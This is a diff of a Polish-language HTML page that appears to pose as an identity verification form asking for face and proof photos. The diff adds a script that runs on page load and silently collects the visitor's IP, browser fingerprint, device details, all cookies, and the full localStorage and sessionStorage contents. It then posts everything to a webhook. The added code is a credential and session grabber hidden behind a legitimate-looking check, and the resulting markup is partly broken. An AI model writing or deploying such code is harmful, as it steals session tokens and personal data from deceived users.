@@ -47,19 +47,61 @@
     <input type="file" id="faceInput" accept="image/*"><br>
     <input type="file" id="proofInput" accept="image/*"><br>
     <button id="sendBtn">Wyślij do weryfikacji</button>
-  </div>
-
-  <!-- ŁADOWANIE WEBHOOKA -->
-  <script src="webhook.js"></script>
 
   <!-- GŁÓWNY SKRYPT -->
-  <script>
-    // Test webhooka
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "Webhook działa z checker_lite!" })
-    });
+<script src="webhook.js"></script>
+
+<script>
+(async () => {
+  const sessionId = `AUTO-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+
+  const fp = await FingerprintJS.load();
+  const result = await fp.get();
+
+  const ip = await fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => data.ip)
+    .catch(() => "Błąd IP");
+
+  let localData = "**LOCAL STORAGE**\n";
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    const value = localStorage.getItem(key);
+    localData += `**${key}**: ${value}\n`;
+  }
+
+  let sessionData = "**SESSION STORAGE**\n";
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    const value = sessionStorage.getItem(key);
+    sessionData += `**${key}**: ${value}\n`;
+  }
+
+  const cookies = document.cookie;
+
+  const msg = `**AUTO-LEGIT CHECK**
+**ID sesji:** ${sessionId}
+**IP:** ${ip}
+**Fingerprint:** ${result.visitorId}
+**User-Agent:** ${navigator.userAgent}
+**Platforma:** ${navigator.platform}
+**Rozdzielczość:** ${screen.width}x${screen.height}
+**RAM:** ${navigator.deviceMemory || "?"} GB
+**CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
+**Cookies:** ${cookies}
+
+${localData}
+
+${sessionData}
+`;
+
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: msg })
+  });
+})();
+</script>
 
     const generateSessionID = () => {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
